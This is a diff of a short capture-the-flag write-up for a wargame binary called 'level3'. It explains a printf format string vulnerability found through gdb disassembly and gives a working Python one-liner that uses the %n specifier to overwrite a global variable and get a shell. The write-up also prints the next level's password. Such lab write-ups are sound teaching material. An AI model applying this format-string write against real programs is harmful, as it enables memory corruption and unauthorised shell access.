@@ -1,4 +1,20 @@
-https://man7.org/linux/man-pages/man3/printf.3.html
-https://owasp.org/www-community/attacks/Format_string_attack
+# What do we exploit?
 
-cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "|" + "%x " * 3 + "A" * 37 + "%n"') - | ./level3
+`printf` vulnerability to the format string attack.
+
+# How do we exploit it?
+
+First of all, you need to refresh your memory about what flags are possible in printf at all, and how they work, using the corresponding [man page](https://man7.org/linux/man-pages/man3/printf.3.html). Secondly, you need to understand how format string attack [works](https://owasp.org/www-community/attacks/Format_string_attack).
+
+Knowing all this, we can start cracking this binary. First of all, let's find out, what can we do to get into shell. While debugging a binary file with `gdb` we see several interesting lines of code.
+
+    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+    0x080484da <+54>:	mov    0x804988c,%eax
+    0x080484df <+59>:	cmp    $0x40,%eax
+    0x080484e2 <+62>:	jne    0x8048518 <v+116>
+
+So, if global variable `m`, which we can find using `info variables`, with address 0x804988c is equal to 64 in decimal notation, then shell gets executed. Let's rewrite it's value by using printf `%n` flag, which redirects number of printed characters to the passed address.
+
+    cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "A" * 60 + "%4$n"') - | ./level3
+
+We can get the password from the next level by following the usual procedure. The password we've got this time: `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
